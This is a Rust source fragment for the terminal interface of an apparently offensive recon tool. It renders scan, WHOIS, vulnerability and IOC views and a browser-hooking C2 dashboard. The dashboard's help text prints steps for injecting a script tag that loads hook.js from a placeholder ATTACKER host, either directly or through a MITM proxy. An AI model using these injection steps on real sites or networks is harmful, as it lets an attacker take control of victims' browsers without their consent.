impl TuiApp {
  fn render_tabs(&self) -> Result<(), String> {
    // All tabs with their numbers (1 = first, 0 = last)
    // Organized by resource type (not scan mode)
    let tabs = [
      (1, "Overview", ViewMode::Overview),
      (2, "Network", ViewMode::Network),
      (3, "Subdomains", ViewMode::Subdomains),
      (4, "Ports", ViewMode::Ports),
      (5, "Services", ViewMode::Services),
      (6, "Certs", ViewMode::Certs),
      (7, "WHOIS", ViewMode::Whois),
      (8, "DNS", ViewMode::DNS),
      (9, "HTTP", ViewMode::HTTP),
    ];
    // Additional tabs (not in numbered array)
    let extra_tabs = [
      ("V", "Vuln", ViewMode::Vuln),
      ("M", "Mitre", ViewMode::Mitre),
      ("I", "IOC", ViewMode::IOC),
      ("R", "RBB", ViewMode::RBB),           // [R] RedBlue Browser C2
      ("0", "Activity", ViewMode::Activity), // [0] Activity log
    ];

    print!("{}", ansi::move_to(2, 1));

    // Render numbered tabs (1-9)
    for (num, label, mode) in tabs.iter() {
      let is_active = std::mem::discriminant(&self.mode) == std::mem::discriminant(mode);

      if is_active {
        // Active tab: bright cyan background with black text (k9s style)
        print!("{}{}{}", ansi::BG_BRIGHT_CYAN, ansi::BLACK, ansi::BOLD);
        print!(" [{}] {} ", num, label);
        print!("{}", ansi::RESET);
      } else {
        // Inactive tab: dim gray text
        print!("{}", ansi::DIM);
        print!(" [{}] {} ", num, label);
        print!("{}", ansi::RESET);
      }
    }

    // Render extra tabs (R, 0)
    for (key, label, mode) in extra_tabs.iter() {
      let is_active = std::mem::discriminant(&self.mode) == std::mem::discriminant(mode);

      if is_active {
        print!("{}{}{}", ansi::BG_BRIGHT_CYAN, ansi::BLACK, ansi::BOLD);
        print!(" [{}] {} ", key, label);
        print!("{}", ansi::RESET);
      } else {
        print!("{}", ansi::DIM);
        print!(" [{}] {} ", key, label);
        print!("{}", ansi::RESET);
      }
    }

    // Clear rest of line
    print!("{}", ansi::CLEAR_LINE);
    println!();

    Ok(())
  }

  /// Render command bar (k9s style: only show when in command mode)
  fn render_command_bar(&self) -> Result<(), String> {
    if self.command_mode {
      // Show command input at bottom (above footer)
      let cmd_row = self.size.rows - 2;
      print!(
        "{}{}{}",
        ansi::move_to(cmd_row, 1),
        ansi::BG_BLACK,
        ansi::YELLOW
      );
      let text = format!(" :{}_", self.command_buffer);
      print!("{}", text);

      // Pad the rest of the line
      let padding = (self.size.cols as usize).saturating_sub(text.len());
      print!("{}", " ".repeat(padding));
      println!("{}", ansi::RESET);
    }

    Ok(())
  }

  /// Render content area
  fn render_content(&mut self) -> Result<(), String> {
    let content_start_row = 3; // Line 1: header, Line 2: tabs, Line 3+: content
    let content_end_row = self.size.rows - 2;
    let available_rows = (content_end_row - content_start_row) as usize;

    // Clear content area by filling with spaces
    // This ensures no artifacts from previous views
    self.clear_content_area(content_start_row, content_end_row)?;

    match self.mode {
      ViewMode::Overview => self.render_overview(content_start_row, available_rows)?,
      ViewMode::Network
      | ViewMode::Ports
      | ViewMode::Subdomains
      | ViewMode::Services
      | ViewMode::DNS
      | ViewMode::HTTP
      | ViewMode::Vuln
      | ViewMode::Mitre
      | ViewMode::IOC => self.render_table(content_start_row, available_rows)?,
      ViewMode::Graph => self.render_graph(content_start_row, available_rows)?,
      ViewMode::RBB => self.render_rbb(content_start_row, available_rows)?,
      ViewMode::Whois | ViewMode::Certs | ViewMode::Sessions => {
        self.render_keyvalue(content_start_row, available_rows)?
      }
      ViewMode::Activity | ViewMode::Normal | ViewMode::Stealth | ViewMode::Aggressive => {
        self.render_scan_activity(content_start_row, available_rows)?
      }
    }

    Ok(())
  }

  /// Clear content area with black background
  fn clear_content_area(&self, start_row: u16, end_row: u16) -> Result<(), String> {
    let blank_line = " ".repeat(self.size.cols as usize);
    for row in start_row..end_row {
      print!("{}{}", ansi::move_to(row, 1), blank_line);
    }
    Ok(())
  }

  /// Render overview mode
  fn render_overview(&self, start_row: u16, _available_rows: usize) -> Result<(), String> {
    let mut row = start_row;

    // Summary stats
    println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
    println!("SCAN SUMMARY");
    println!("{}", ansi::RESET);
    row += 2;

    if let Some(ref meta) = self.metadata {
      println!(
        "{}  Target:     {}{}",
        ansi::move_to(row, 4),
        ansi::GREEN,
        meta.target
      );
      row += 1;
      println!(
        "{}  Created:    {}{}s ago{}",
        ansi::move_to(row, 4),
        ansi::YELLOW,
        meta.age_secs(),
        ansi::RESET
      );
      row += 1;

      if let Some(dur) = meta.duration_secs {
        println!(
          "{}  Duration:   {}{:.2}s{}",
          ansi::move_to(row, 4),
          ansi::BLUE,
          dur,
          ansi::RESET
        );
        row += 1;
      }
    }

    row += 1;

    // WHOIS Quick Info (if available)
    if !self.whois_data.is_empty() {
      println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
      println!("DOMAIN INFORMATION (WHOIS)");
      println!("{}", ansi::RESET);
      row += 2;

      // Show key WHOIS fields
      for (key, value) in &self.whois_data {
        // Only show important fields in overview
        if key == "Registrar"
          || key == "Creation Date"
          || key == "Expiry Date"
          || key == "Status"
          || key == "Name Servers"
        {
          let display_value = if value.len() > 60 {
            format!("{}...", &value[..57])
          } else {
            value.clone()
          };

          println!(
            "{}  {}{:15}{} {}",
            ansi::move_to(row, 4),
            ansi::DIM,
            format!("{}:", key),
            ansi::RESET,
            display_value
          );
          row += 1;
        }
      }
      row += 1;
    } else {
      // Suggest running WHOIS if not available
      println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::YELLOW);
      println!("DOMAIN INFORMATION");
      println!("{}", ansi::RESET);
      row += 2;

      println!(
        "{}  {}No WHOIS data yet{} - Press {}[6]{} to view or type {}:recon domain whois{}",
        ansi::move_to(row, 4),
        ansi::DIM,
        ansi::RESET,
        ansi::ORANGE,
        ansi::RESET,
        ansi::CYAN,
        ansi::RESET
      );
      row += 2;
    }

    // Database counts
    println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
    println!("DATABASE RESOURCES");
    println!("{}", ansi::RESET);
    row += 2;

    println!(
      "{}  [1] {}Ports:{} {} records",
      ansi::move_to(row, 4),
      ansi::GREEN,
      ansi::RESET,
      self.ports_data.len()
    );
    row += 1;

    println!(
      "{}  [2] {}Subdomains:{} {} records",
      ansi::move_to(row, 4),
      ansi::GREEN,
      ansi::RESET,
      self.subdomains_data.len()
    );
    row += 1;

    println!(
      "{}  [3] {}WHOIS:{} {} records",
      ansi::move_to(row, 4),
      ansi::CYAN,
      ansi::RESET,
      if self.whois_data.is_empty() { 0 } else { 1 }
    );
    row += 1;

    println!(
      "{}  [4] {}Certificates:{} {} records",
      ansi::move_to(row, 4),
      ansi::CYAN,
      ansi::RESET,
      if self.certs_data.is_empty() { 0 } else { 1 }
    );
    row += 1;

    println!(
      "{}  [5] {}Session:{} {} metadata",
      ansi::move_to(row, 4),
      ansi::CYAN,
      ansi::RESET,
      self.sessions_data.len()
    );
    row += 1;

    println!(
      "{}  [V] {}Vulns:{}   {} records",
      ansi::move_to(row, 4),
      ansi::RED,
      ansi::RESET,
      self.vuln_data.len()
    );
    row += 1;

    println!(
      "{}  [I] {}IOCs:{}    {} records",
      ansi::move_to(row, 4),
      ansi::RED,
      ansi::RESET,
      self.ioc_data.len()
    );
    row += 2;

    // Keyboard shortcuts
    println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
    println!("NAVIGATION");
    println!("{}", ansi::RESET);
    row += 2;

    println!(
      "{}  {}[0-9]{} Switch views  {}[j/k/↑↓]{} Scroll  {}[PgUp/PgDn]{} Page  {}[Home/End]{} Jump",
      ansi::move_to(row, 4),
      ansi::ORANGE,
      ansi::RESET,
      ansi::ORANGE,
      ansi::RESET,
      ansi::ORANGE,
      ansi::RESET,
      ansi::ORANGE,
      ansi::RESET
    );

    Ok(())
  }

  /// Render table mode (k9s style: cyan headers, bright cyan selection)
  fn render_table(&self, start_row: u16, available_rows: usize) -> Result<(), String> {
    let rows = self.current_rows();

    // Table header (k9s style: cyan text)
    println!(
      "{}{}{}",
      ansi::move_to(start_row, 2),
      ansi::BOLD,
      ansi::CYAN
    );
    println!("{:<20} {:<12} {:<60}", "NAME↑", "STATUS", "RESULT");
    println!("{}", ansi::RESET);

    let row = start_row + 1;

    if rows.is_empty() {
      println!("{}{}No results found", ansi::move_to(row + 1, 4), ansi::DIM);

      // Show view-specific help
      match self.mode {
        ViewMode::Network => {
          println!(
            "{}  {}Press [s]{} to scan network and discover devices",
            ansi::move_to(row + 2, 4),
            ansi::ORANGE,
            ansi::RESET
          );
          println!(
            "{}  {}Press [a]{} to add device manually",
            ansi::move_to(row + 3, 4),
            ansi::ORANGE,
            ansi::RESET
          );
        }
        ViewMode::Ports => {
          println!(
            "{}  {}Auto-scanning {}{}... (or type {}:scan ports{} for manual trigger)",
            ansi::move_to(row + 2, 4),
            ansi::DIM,
            self.target,
            ansi::RESET,
            ansi::CYAN,
            ansi::RESET
          );
          println!(
            "{}  Target context: {}{}{}",
            ansi::move_to(row + 3, 4),
            ansi::ORANGE,
            self.target,
            ansi::RESET
          );
        }
        ViewMode::Subdomains => {
          println!(
            "{}  {}Auto-scanning {}{}... (or type {}:scan subdomains{} for manual trigger)",
            ansi::move_to(row + 2, 4),
            ansi::DIM,
            self.target,
            ansi::RESET,
            ansi::CYAN,
            ansi::RESET
          );
          println!(
            "{}  Target context: {}{}{}",
            ansi::move_to(row + 3, 4),
            ansi::ORANGE,
            self.target,
            ansi::RESET
          );
        }
        _ => {}
      }

      println!("{}", ansi::RESET);
      return Ok(());
    }

    // Render visible rows
    let end_idx = (self.scroll_offset + available_rows - 2).min(rows.len());

    for (row, (idx, table_row)) in
      (start_row + 1..).zip(rows[self.scroll_offset..end_idx].iter().enumerate())
    {
      let global_idx = self.scroll_offset + idx;
      let is_selected = global_idx == self.selected_row;

      if is_selected {
        // k9s-style selection: bright cyan background
        print!(
          "{}{}{}",
          ansi::move_to(row, 1),
          ansi::BG_BRIGHT_CYAN,
          ansi::BLACK
        );
      } else {
        print!("{}", ansi::move_to(row, 2));
      }

      let status_color = if table_row.status == "success" {
        ansi::GREEN
      } else {
        ansi::RED
      };

      print!(
        " {:<20} {}{:<10}{} {:<60}",
        table_row.module,
        status_color,
        table_row.status,
        if is_selected {
          ansi::BLACK
        } else {
          ansi::RESET
        },
        truncate(&table_row.data, 60)
      );

      if is_selected {
        print!("{}", ansi::RESET);
      }

      println!();
    }

    Ok(())
  }

  /// Render key-value view (for WHOIS, Certs, Sessions)
  fn render_keyvalue(&self, start_row: u16, _available_rows: usize) -> Result<(), String> {
    let data = self.current_keyvalue();
    let mut row = start_row;

    // Header
    println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
    println!("{} Details", self.mode.title());
    println!("{}", ansi::RESET);
    row += 2;

    if data.is_empty() {
      println!("{}{}No data available", ansi::move_to(row, 4), ansi::DIM);
      return Ok(());
    }

    // Render key-value pairs
    for (key, value) in data {
      println!(
        "{}  {}{:<20}{} {}",
        ansi::move_to(row, 4),
        ansi::CYAN,
        key,
        ansi::RESET,
        value
      );
      row += 1;
    }

    Ok(())
  }

  /// Render RBB (RedBlue Browser) zombie dashboard
  fn render_rbb(&self, start_row: u16, available_rows: usize) -> Result<(), String> {
    let mut row = start_row;

    // Header with server status
    println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
    print!("RBB - Browser Exploitation Dashboard");
    if let Some(ref addr) = self.rbb_server_addr {
      print!(" {}[Server: {}]{}", ansi::GREEN, addr, ansi::CYAN);
    } else {
      print!(" {}[Server: Not Running]{}", ansi::YELLOW, ansi::CYAN);
    }
    println!("{}", ansi::RESET);
    row += 2;

    // Hook URL info
    if let Some(ref addr) = self.rbb_server_addr {
      println!(
        "{}  {}Hook URL:{} http://{}/hook.js",
        ansi::move_to(row, 2),
        ansi::ORANGE,
        ansi::RESET,
        addr
      );
      row += 1;
      println!(
        "{}  {}Inject:{} <script src=\"http://{}/hook.js\"></script>",
        ansi::move_to(row, 2),
        ansi::ORANGE,
        ansi::RESET,
        addr
      );
      row += 2;
    }

    // Zombies table header
    println!(
      "{}  {}ID              IP              OS          Page                  Last Seen{}",
      ansi::move_to(row, 2),
      ansi::BOLD,
      ansi::RESET
    );
    row += 1;
    println!(
      "{}  {}{}{}",
      ansi::move_to(row, 2),
      ansi::DIM,
      "-".repeat(78.min(self.size.cols as usize - 4)),
      ansi::RESET
    );
    row += 1;

    if self.rbb_zombies.is_empty() {
      println!(
        "{}  {}No hooked browsers yet{}",
        ansi::move_to(row, 2),
        ansi::DIM,
        ansi::RESET
      );
      row += 2;

      // Instructions
      println!(
        "{}  {}To hook browsers:{}",
        ansi::move_to(row, 2),
        ansi::ORANGE,
        ansi::RESET
      );
      row += 1;
      println!(
        "{}    1. Start RBB server: {}:rbb serve{}",
        ansi::move_to(row, 2),
        ansi::CYAN,
        ansi::RESET
      );
      row += 1;
      println!(
        "{}    2. Use MITM proxy to inject hook: {}:mitm --hook http://ATTACKER:3000/hook.js{}",
        ansi::move_to(row, 2),
        ansi::CYAN,
        ansi::RESET
      );
      row += 1;
      println!(
        "{}    3. Or manually inject: {}<script src=\"http://ATTACKER:3000/hook.js\"></script>{}",
        ansi::move_to(row, 2),
        ansi::CYAN,
        ansi::RESET
      );
    } else {
      // Render zombie list (use TableRow format)
      for (i, zombie) in self.rbb_zombies.iter().enumerate() {
        if row >= start_row + available_rows as u16 - 2 {
          break;
        }

        let is_selected = i == self.selected_row;
        let prefix = if is_selected { ">" } else { " " };
        let highlight = if is_selected { ansi::REVERSE } else { "" };
        let reset = if is_selected { ansi::RESET } else { "" };

        // TableRow: module=ID, status=IP, data=Page
        println!(
          "{}{}{}  {:<14} {:<14} {:<10} {:<20} {}{}",
          ansi::move_to(row, 2),
          highlight,
          prefix,
          &zombie.module,                 // Zombie ID
          &zombie.status,                 // IP address
          "Unknown",                      // OS (could be parsed from data)
          truncate_str(&zombie.data, 20), // Page
          if zombie.timestamp > 0 {
            format!("{}s ago", now_secs() - zombie.timestamp)
          } else {
            "?".to_string()
          },
          reset
        );
        row += 1;
      }
    }

    Ok(())
  }

  /// Render intel graph view
  fn render_graph(&self, start_row: u16, available_rows: usize) -> Result<(), String> {
    let mut row = start_row;

    // Header
    println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
    print!("Intel Graph");

    if let Ok(graph) = self.graph.read() {
      let node_count = graph.node_count();
      let edge_count = graph.edge_count();
      print!(" [{}N/{}E]", node_count, edge_count);
    }

    if let Some(ref node) = self.graph_current_node {
      print!(" {}Context: {}{}", ansi::GREEN, node, ansi::CYAN);
    }
    println!("{}", ansi::RESET);
    row += 2;

    // Show graph data or nodes list
    if self.graph_data.is_empty() {
      println!(
        "{}  {}Graph is empty. Run scans to populate, or use 'nodes' command.{}",
        ansi::move_to(row, 2),
        ansi::DIM,
        ansi::RESET
      );
      row += 2;

      // Quick instructions
      println!(
        "{}  {}Commands:{}",
        ansi::move_to(row, 2),
        ansi::ORANGE,
        ansi::RESET
      );
      row += 1;
      println!(
        "{}    :nodes       - List all graph nodes",
        ansi::move_to(row, 2)
      );
      row += 1;
      println!(
        "{}    :node <id>   - Select a node as context",
        ansi::move_to(row, 2)
      );
      row += 1;
      println!(
        "{}    :neighbors   - Show neighbors from context",
        ansi::move_to(row, 2)
      );
      row += 1;
      println!(
        "{}    :reach       - What can I reach from here?",
        ansi::move_to(row, 2)
      );
      row += 1;
      println!(
        "{}    :paths a b   - Find paths between nodes",
        ansi::move_to(row, 2)
      );
      row += 1;
      println!(
        "{}    :pagerank    - Find influential nodes",
        ansi::move_to(row, 2)
      );
      row += 1;
      println!(
        "{}    :components  - Find network segments",
        ansi::move_to(row, 2)
      );
    } else {
      // Table header
      println!(
        "{}  {}ID                    Type           Label{}",
        ansi::move_to(row, 2),
        ansi::BOLD,
        ansi::RESET
      );
      row += 1;
      println!(
        "{}  {}{}{}",
        ansi::move_to(row, 2),
        ansi::DIM,
        "-".repeat(70.min(self.size.cols as usize - 4)),
        ansi::RESET
      );
      row += 1;

      // Render node rows
      let visible_start = self.scroll_offset;
      let visible_end = (visible_start + available_rows - 6).min(self.graph_data.len());

      for (i, node) in self
        .graph_data
        .iter()
        .enumerate()
        .skip(visible_start)
        .take(visible_end - visible_start)
      {
        if row >= start_row + available_rows as u16 - 2 {
          break;
        }

        let is_selected = i == self.selected_row;
        let is_context = Some(&node.module) == self.graph_current_node.as_ref();

        let prefix = if is_selected {
          ">"
        } else if is_context {
          "→"
        } else {
          " "
        };

        let color = if is_context {
          ansi::GREEN
        } else if is_selected {
          ansi::BRIGHT_CYAN
        } else {
          ""
        };

        println!(
          "{}{}{}  {:<20} {:<14} {}{}",
          ansi::move_to(row, 2),
          color,
          prefix,
          truncate_str(&node.module, 20),
          truncate_str(&node.status, 14),
          truncate_str(&node.data, 35),
          ansi::RESET
        );
        row += 1;
      }
    }

    Ok(())
  }

  /// Render scan activity (for Normal, Stealth, Aggressive modes)
  fn render_scan_activity(&self, start_row: u16, available_rows: usize) -> Result<(), String> {
    let mut row = start_row;

    // Header
    println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
    println!("Scan Activity - {} Mode", self.mode.title());
    println!("{}", ansi::RESET);
    row += 2;

    if self.scan_activity.is_empty() {
      println!("{}{}No activity logged", ansi::move_to(row, 4), ansi::DIM);
      return Ok(());
    }

    // Show last N lines of activity
    let start_idx = self.scan_activity.len().saturating_sub(available_rows - 4);
    for line in &self.scan_activity[start_idx..] {
      println!("{}  {}", ansi::move_to(row, 4), line);
      row += 1;
      if row >= start_row + available_rows as u16 - 2 {
        break;
      }
    }

    Ok(())
  }

  /// Render footer bar (k9s style: orange background with black text)
  fn render_footer(&self) -> Result<(), String> {
    let footer_row = self.size.rows - 1;

    print!(
      "{}{}{}",
      ansi::move_to(footer_row, 1),
      ansi::BG_ORANGE,
      ansi::BLACK
    );

    // View-specific commands/shortcuts
    let commands = match self.mode {
      ViewMode::Network => {
        if self.network_scan_running {
          " [s]Stop scan [:]Commands [:scan network] [r]Refresh "
        } else {
          " [s]Start scan [:]Commands [:scan network] [r]Refresh "
        }
      }
      ViewMode::Ports => " [:scan ports] [:]Commands [d]Delete [r]Refresh ",
      ViewMode::Subdomains => " [:scan subdomains] [:recon domain subdomains] [:]Commands ",
      ViewMode::Overview => " [1-9,0]Switch view [:]Commands [r]Refresh [q]Quit ",
      ViewMode::Vuln => " [:vuln scan] [:vuln correlate] [s]Scan [d]Delete [r]Refresh ",
      ViewMode::Mitre => " [:intel mitre map] [:intel mitre search] [r]Refresh ",
      ViewMode::IOC => " [:intel ioc extract] [:intel ioc export] [d]Delete [r]Refresh ",
      ViewMode::RBB => " [:rbb serve] [:rbb list] [:rbb exec] [:]Commands [q]Quit ",
      _ => " [1-9,0]Views [j/k/↑↓]Scroll [PgUp/Dn]Page [:]Cmd [r]Refresh [q]Quit ",
    };

    print!("{}", commands);

    // Pad the rest of the line (saturating to prevent underflow)
    let padding = (self.size.cols as usize).saturating_sub(commands.len() + 1);
    print!("{}", " ".repeat(padding));

    println!("{}", ansi::RESET);

    Ok(())
  }

  /// Process input key
  fn process_key(&mut self, key: Key) -> Result<(), String> {
    if self.command_mode {
      self.handle_command_input(key)?;
    } else {
      self.handle_normal_input(key)?;
    }
    Ok(())
  }

  /// Handle input in command mode
  fn handle_command_input(&mut self, key: Key) -> Result<(), String> {
    match key {
      Key::Enter => {
        // Execute command
        let cmd = self.command_buffer.clone();
        self.command_buffer.clear();
        self.command_mode = false;
        self.execute_command(&cmd)?;
      }
      Key::Esc => {
        // Cancel
        self.command_buffer.clear();
        self.command_mode = false;
      }
      Key::Backspace => {
        self.command_buffer.pop();
      }
      Key::Char(ch) => {
        self.command_buffer.push(ch);
      }
      _ => {}
    }
    Ok(())
  }

  /// Handle input in normal mode
  fn handle_normal_input(&mut self, key: Key) -> Result<(), String> {
    match key {
      Key::Char('q') | Key::Char('Q') => {
        self.running = false;
      }
      Key::Char(':') => {
        self.command_mode = true;
        self.command_buffer.clear();
      }
      Key::Char('1') => self.switch_view(ViewMode::Overview)?,
      Key::Char('2') => self.switch_view(ViewMode::Subdomains)?,
      Key::Char('3') => self.switch_view(ViewMode::Ports)?,
      Key::Char('4') => self.switch_view(ViewMode::Services)?,
      Key::Char('5') => self.switch_view(ViewMode::Certs)?,
      Key::Char('6') => self.switch_view(ViewMode::Whois)?,
      Key::Char('7') => self.switch_view(ViewMode::DNS)?,
      Key::Char('8') => self.switch_view(ViewMode::HTTP)?,
      Key::Char('v') | Key::Char('V') => self.switch_view(ViewMode::Vuln)?,
      Key::Char('m') | Key::Char('M') => self.switch_view(ViewMode::Mitre)?,
      Key::Char('i') | Key::Char('I') => self.switch_view(ViewMode::IOC)?,
      Key::Char('9') => self.switch_view(ViewMode::RBB)?, // RBB Browser C2 dashboard
      Key::Char('0') => self.switch_view(ViewMode::Activity)?,

      Key::Tab => {
        let next_mode = self.mode.next();
        self.switch_view(next_mode)?;
      }
      Key::Char('n') | Key::Char('N') => {
        let next_mode = self.mode.next();
        self.switch_view(next_mode)?;
      }
      Key::Char('p') | Key::Char('P') => {
        let prev_mode = self.mode.prev();
        self.switch_view(prev_mode)?;
      }
      Key::Down | Key::Char('j') | Key::Char('J') => {
        self.scroll_down();
      }
      Key::Up | Key::Char('k') | Key::Char('K') => {
        self.scroll_up();
      }
      Key::PageDown => self.scroll_page_down(),
      Key::PageUp => self.scroll_page_up(),
      Key::Home => self.scroll_to_top(),
      Key::End => self.scroll_to_bottom(),

      Key::Char('r') | Key::Char('R') => {
        self.refresh_current_view()?;
        self.scan_activity.push("Data refreshed".to_string());
      }
      Key::Char('s') | Key::Char('S') => self.handle_scan_action()?,
      Key::Char('a') | Key::Char('A') => self.handle_add_action()?,
      Key::Char('d') | Key::Char('D') => self.handle_delete_action()?,
      Key::Enter => self.handle_enter_action()?,
      _ => {}
    }
    Ok(())
  }

  /// Handle scan action (view-specific)
  fn handle_scan_action(&mut self) -> Result<(), String> {
    match self.mode {
      ViewMode::Network => {
        self
          .scan_activity
          .push("Starting network discovery scan...".to_string());
        self.execute_network_scan()?;
      }
      ViewMode::Ports => {
        self.scan_activity.push("Starting port scan...".to_string());
        self.execute_port_scan()?;
      }
      ViewMode::Subdomains => {
        self
          .scan_activity
          .push("Starting subdomain enumeration...".to_string());
        self.execute_subdomain_scan()?;
      }
      ViewMode::Overview => {
        self
          .scan_activity
          .push("Starting WHOIS lookup...".to_string());
        self.execute_whois_lookup()?;
      }
      ViewMode::Vuln => {
        self
          .scan_activity
          .push("Starting vulnerability scan...".to_string());
        self.execute_vuln_scan()?;
      }
      _ => {
        self
          .scan_activity
          .push("No scan action available for this view".to_string());
      }
    }
    Ok(())
  }

  /// Handle add action (view-specific)
  fn handle_add_action(&mut self) -> Result<(), String> {
    match self.mode {
      ViewMode::Network => {
        self
          .scan_activity
          .push("Manual add mode: type target in command line as add <ip> [status]".to_string());
        self.command_mode = true;
        self.command_buffer.clear();
        self.command_buffer = "add ".to_string();
      }
      _ => {}
    }
    Ok(())
  }

  /// Handle delete action (view-specific)
  fn handle_delete_action(&mut self) -> Result<(), String> {
    match self.mode {
      ViewMode::Network => {
        if !self.network_data.is_empty() && self.selected_row < self.network_data.len() {
          let removed = self.network_data.remove(self.selected_row);
          self
            .scan_activity
            .push(format!("Removed device: {}", removed.module));
          if self.selected_row > 0 {
            self.selected_row -= 1;
          }
        }
      }
      ViewMode::Ports => {
        if !self.ports_data.is_empty() && self.selected_row < self.ports_data.len() {
          let removed = self.ports_data.remove(self.selected_row);
          self
            .scan_activity
            .push(format!("Removed port: {}", removed.module));
          if self.selected_row > 0 {
            self.selected_row -= 1;
          }
        }
      }
      ViewMode::Subdomains => {
        if !self.subdomains_data.is_empty() && self.selected_row < self.subdomains_data.len() {
          let removed = self.subdomains_data.remove(self.selected_row);
          self
            .scan_activity
            .push(format!("Removed subdomain: {}", removed.module));
          if self.selected_row > 0 {
            self.selected_row -= 1;
          }
        }
      }
      ViewMode::Vuln => {
        if !self.vuln_data.is_empty() && self.selected_row < self.vuln_data.len() {
          self.vuln_data.remove(self.selected_row);
          self
            .scan_activity
            .push("Removed vulnerability record".to_string());
          if self.selected_row > 0 {
            self.selected_row -= 1;
          }
        }
      }
      ViewMode::IOC => {
        if !self.ioc_data.is_empty() && self.selected_row < self.ioc_data.len() {
          self.ioc_data.remove(self.selected_row);
          self.scan_activity.push("Removed IOC record".to_string());
          if self.selected_row > 0 {
            self.selected_row -= 1;
          }
        }
      }
      _ => {}
    }
    Ok(())
  }

  // Handle Enter key (view-specific)

}
